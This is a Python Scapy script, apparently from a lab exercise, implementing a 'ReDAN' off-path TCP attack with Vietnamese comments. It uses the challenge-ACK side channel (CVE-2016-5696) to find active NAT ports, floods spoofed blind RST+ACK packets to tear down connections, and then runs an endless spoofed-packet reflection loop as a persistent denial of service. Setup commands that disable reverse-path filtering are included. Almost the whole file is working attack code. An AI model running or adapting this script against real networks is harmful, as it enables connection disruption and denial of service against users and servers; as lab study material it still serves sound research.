#!/usr/bin/env python3
"""
ReDAN OFF-PATH Attacker (Challenge ACK Side-Channel)
═════════════════════════════════════════════════════
Off-path: Attacker nằm trên mạng riêng VMnet12 (2.2.2.0/24),
hoàn toàn tách biệt khỏi Server (VMnet10) và Client (VMnet8).
Mọi gói tin đều được định tuyến qua Backbone Router (2.2.2.1 → 1.1.1.200).

  Spy connection: ens33 (VMnet12) → Backbone → VMnet10 → Server
  Attack packets: ens33 (VMnet12) → Backbone → VMnet10 → Server/NAT

Chuẩn bị (BẮT BUỘC):
  [Backbone] sudo ip addr add 1.1.1.200/24 dev ens33  (VMnet10)
             sudo ip addr add 2.2.2.1/24 dev ens37    (VMnet12)
             sudo sysctl -w net.ipv4.ip_forward=1
             sudo sysctl -w net.ipv4.conf.all.rp_filter=0
  [Attacker] sudo ip route add 1.1.1.0/24 via 2.2.2.1 dev ens33
             sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -s 2.2.2.20 -j DROP
  [Client]   sudo sysctl -w net.ipv4.ip_local_port_range="40000 40010"
  [Server]   sudo sysctl -w net.ipv4.tcp_challenge_ack_limit=1000
             sudo sysctl -w net.ipv4.tcp_syncookies=1
             sudo ip route add 2.2.2.0/24 via 1.1.1.200
  [OpenWrt]  sysctl -w net.netfilter.nf_conntrack_tcp_loose=1

Chạy: sudo python3 attacker.py
"""

import sys, time, random
from scapy.all import IP, TCP, Raw, send, sendpfast, sr1, sniff, AsyncSniffer, conf

# ═══════════════════ CẤU HÌNH MẠNG ═══════════════════
NAT_PUBLIC_IP    = "1.1.1.1"
SERVER_IP        = "1.1.1.10"
SERVER_PORT      = 8080

ATTACKER_SPY_IP  = "2.2.2.20"       # IP Attacker trên VMnet12 (mạng riêng)
SPY_IFACE        = "ens33"           # Card VMnet12
ATTACK_IFACE     = "ens33"           # Dùng chung ens33 (mọi thứ qua OpenWrt)
SPY_PORT         = random.randint(50000, 59999)  # Random port tránh TIME_WAIT

EPHEM_START = 40000
EPHEM_END   = 40011

# Phải khớp với: sysctl net.ipv4.tcp_challenge_ack_limit
CHALLENGE_ACK_LIMIT = 5   # Server limit = 1, gửi 5 với inter=0.01

# ═══════════════════ SPY CONNECTION ══════════════════
spy_seq = 0
spy_ack = 0

def setup_spy():
    """Tạo kết nối TCP hợp pháp từ Attacker đến Server."""
    global spy_seq, spy_ack
    print("\n[0] Thiết lập Spy connection...")
    isn = random.randint(1000, 50000)
    syn = (IP(src=ATTACKER_SPY_IP, dst=SERVER_IP) /
           TCP(sport=SPY_PORT, dport=SERVER_PORT, flags="S", seq=isn))
    resp = sr1(syn, iface=SPY_IFACE, timeout=3, verbose=False)
    if resp is None:
        print("[!] Spy FAIL! Kiểm tra:")
        print("    1) sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -s 2.2.2.20 -j DROP")
        print("    2) Server đang chạy: python3 server.py")
        print("    3) ping 1.1.1.10  (qua Backbone)")
        sys.exit(1)
    spy_seq = isn + 1
    spy_ack = resp[TCP].seq + 1
    ack = (IP(src=ATTACKER_SPY_IP, dst=SERVER_IP) /
           TCP(sport=SPY_PORT, dport=SERVER_PORT, flags="A",
               seq=spy_seq, ack=spy_ack))
    send(ack, iface=SPY_IFACE, verbose=False)
    print(f"    Spy OK (seq={spy_seq}, ack={spy_ack})")

def probe_spy():
    """Gửi SYN trên spy connection, đợi Challenge ACK.
    True = nhận ACK (counter còn)
    False = không nhận (counter cạn → có port hoạt động)"""
    # Probe phải dùng src=ATTACKER_SPY_IP vì spy connection là IP thật.
    probe = (IP(src=ATTACKER_SPY_IP, dst=SERVER_IP) /
             TCP(sport=SPY_PORT, dport=SERVER_PORT, flags="S",
                 seq=spy_seq + random.randint(100000, 999999)))
    bpf = (f"src host {SERVER_IP} and src port {SERVER_PORT} and dst host {ATTACKER_SPY_IP} and dst port {SPY_PORT}")
    sniffer = AsyncSniffer(iface=SPY_IFACE, count=1, timeout=0.5, filter=bpf)
    sniffer.start()
    time.sleep(0.02)
    send(probe, iface=SPY_IFACE, verbose=False)
    sniffer.join()
    return len(sniffer.results) > 0
def ensure_spy():
    """Gửi ACK keepalive, thiết lập lại spy nếu mất kết nối."""
    ack_pkt = (IP(src=ATTACKER_SPY_IP, dst=SERVER_IP) /
               TCP(sport=SPY_PORT, dport=SERVER_PORT, flags="A",
                   seq=spy_seq, ack=spy_ack))
    resp = sr1(ack_pkt, iface=SPY_IFACE, timeout=1, verbose=False)
    if resp is not None and TCP in resp and resp[TCP].flags & 0x04:  # RST?
        print("[!] Spy mất kết nối, thiết lập lại...")
        setup_spy()


# ════════════════ STAGE 1: PORT DISCOVERY ════════════
def stage1():
    print(f"\n[1] PORT DISCOVERY (Challenge ACK Side-Channel)")
    print(f"    Quét {EPHEM_START}—{EPHEM_END-1} ({EPHEM_END-EPHEM_START} ports)")
    print(f"    Kỹ thuật: SYN-ACK spoofed (CVE-2016-5696)")
    found = []

    # Self-test: spy probe phải hoạt động
    print("    Self-test spy probe...", end=" ", flush=True)
    time.sleep(1.5)
    if probe_spy():
        print("OK ✓")
    else:
        print("FAIL ✗")
        print("    [!] Spy probe không phản hồi!")
        print("    Đã chạy: sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -s 2.2.2.20 -j DROP ?")
        return found

    for port in range(EPHEM_START, EPHEM_END):
        # Đợi counter reset (1 giây)
        time.sleep(1.5)

        # inter=0.01 vượt per-socket rate limit kernel 5.15+
        pkts = [IP(src=NAT_PUBLIC_IP, dst=SERVER_IP) /
                TCP(sport=port, dport=SERVER_PORT, flags="S",
                    seq=random.randint(0, 2**32-1))
                for _ in range(CHALLENGE_ACK_LIMIT)]
        send(pkts, iface=SPY_IFACE, verbose=False, inter=0.01)

        # Probe NGAY — TRƯỚC ensure_spy (ensure_spy có timeout 1s gây delay)
        time.sleep(0.02)
        got_ack = probe_spy()

        # (Bỏ ensure_spy ở đây vì timeout 1s làm quá trình quét quá chậm)
        # ensure_spy()

        if not got_ack:
            print(f"    ✓ Port {port}: FOUND!")
            found.append(port)
        else:
            print(f"      Port {port}: —")

    return found

# ════════════ STAGE 2: RST BRUTE-FORCE (OFF-PATH) ═════════════
def stage2(ports):
    print(f"\n[2] TEAR DOWN — RST+ACK Brute-force (Strict Off-Path)")
    print("    Quét mù không gian Sequence (Blind Sweep) để tìm Window...")
    
    # Chia nhỏ 150,000 bước (step ~ 28633) để chắc chắn lọt vào cửa sổ TCP (thường ~30000-65535)
    STEPS = 150000
    step_sz = (2**32) // STEPS

    # Dùng L3socket để gửi gói cực nhanh
    sock = conf.L3socket(iface=SPY_IFACE)

    for port in ports:
        print(f"    Port {port}: Đang dội {STEPS} gói RST+ACK mù (Tối ưu hóa CPU)...")
        # Khởi tạo gói tin mẫu (Chỉ tạo 1 lần để tiết kiệm CPU)
        base_pkt = IP(src=SERVER_IP, dst=NAT_PUBLIC_IP) / TCP(sport=SERVER_PORT, dport=port, flags="RA")
        
        for i in range(STEPS):
            base_pkt[TCP].seq = (i * step_sz) % (2**32)
            # Xóa checksum cũ để Scapy tính lại
            del base_pkt[TCP].chksum
            sock.send(base_pkt)
            
            if i % 30000 == 0 and i > 0:
                print(f"        Tiến độ: {i}/{STEPS} gói...", end="\r")
                
        print(f"    ✓ Port {port}: Hoàn tất vòng quét! (Bảng NAT đã chuyển sang CLOSE)       ")
    sock.close()

# ════════════ STAGE 3: TCP STATE MANIPULATION (REFLECTION) ═════════════════
def stage3(ports):
    print(f"\n[3] PERSISTENT DoS (TCP State Manipulation)")
    print("    Duy trì trạng thái ngắt kết nối: Ép NAT liên tục dội RST về Server.")
    print("    Nhấn Ctrl+C để dừng tấn công.")
    
    print("    [!] Đang chờ 3 giây để Router dọn sạch bản ghi CLOSE trong nf_conntrack...")
    for i in range(3, 0, -1):
        print(f"        Chờ {i}s...", end="\r")
        time.sleep(1)
    print("    [!] Kích hoạt vòng lặp Reflection vô tận!                ")
    
    sock = conf.L3socket(iface=SPY_IFACE)
    
    sweep_count = 0
    try:
        while True:
            for port in ports:
                # Gửi gói tin giả mạo chứa payload (PSH+ACK) từ NAT đến Server.
                payload = b"GET / HTTP/1.1\r\n\r\n"
                
                # Bắn vài gói với seq/ack ảo để chắc chắn Server coi là DUP/Out-of-Window
                for i in range(3):
                    seq = random.randint(1000, 2**32-1)
                    ack = random.randint(1000, 2**32-1)
                    pkt = (IP(src=NAT_PUBLIC_IP, dst=SERVER_IP) / 
                           TCP(sport=port, dport=SERVER_PORT, flags="PA", seq=seq, ack=ack) / 
                           Raw(load=payload))
                    sock.send(pkt)
                    
            sweep_count += 1
            print(f"    [*] Đã rải mồi nhử duy trì ngắt kết nối (Lượt {sweep_count})...", end="\r")
            
            # Tạm nghỉ 2 giây giữa mỗi đợt để giảm tải CPU cho Attacker, 
            # nhưng vẫn đủ nhanh để chặn Client trước khi nó kịp Reconnect hoàn toàn.
            time.sleep(2)
            
    except KeyboardInterrupt:
        print("\n    [!] Đã dừng vòng lặp DoS.")
    finally:
        sock.close()
        print("\n[*] TẤN CÔNG HOÀN TẤT! Client/Server có thể kết nối lại bình thường.")

# ═════════════════════ MAIN ═════════════════════
def main():
    print("=" * 60)
    print("  ██████╗ ███████╗██████╗  █████╗ ███╗   ██╗")
    print("  ██╔══██╗██╔════╝██╔══██╗██╔══██╗████╗  ██║")
    print("  ██████╔╝█████╗  ██║  ██║███████║██╔██╗ ██║")
    print("  ██╔══██╗██╔══╝  ██║  ██║██╔══██║██║╚██╗██║")
    print("  ██║  ██║███████╗██████╔╝╚█████╔╝██║ ╚████║")
    print("  ╚═╝  ╚═╝╚══════╝╚═════╝  ╚════╝ ╚═╝  ╚═══╝")
    print("  OFF-PATH — Challenge ACK Side-Channel")
    print("=" * 60)
    print(f"\n  Attacker : {ATTACKER_SPY_IP} ({SPY_IFACE})")
    print(f"  Target   : {SERVER_IP}:{SERVER_PORT}")
    print(f"  NAT      : {NAT_PUBLIC_IP}")
    print(f"  Scan     : Port {EPHEM_START}→{EPHEM_END-1}")

    skip_scan = "--skip-scan" in sys.argv

    if skip_scan:
        # Simplified ReDAN: bỏ qua oracle, dùng toàn bộ range
        print("\n[MODE] Skip-scan: Stage 1 bị bỏ qua")
        ports = list(range(EPHEM_START, EPHEM_END))
        print(f"[✓] Attacking all ports: {ports}")
    else:
        setup_spy()
        ports = stage1()
        if not ports:
            print("\n[!] Không tìm thấy port nào!")
            print("    Thử lại: sudo python3 attacker.py --skip-scan")
            sys.exit(1)
        print(f"\n[✓] Found: {ports}")

    stage2(ports)

    try:
        stage3(ports)
    except KeyboardInterrupt:
        print("\n[!] Đã dừng.")

if __name__ == "__main__":
    main()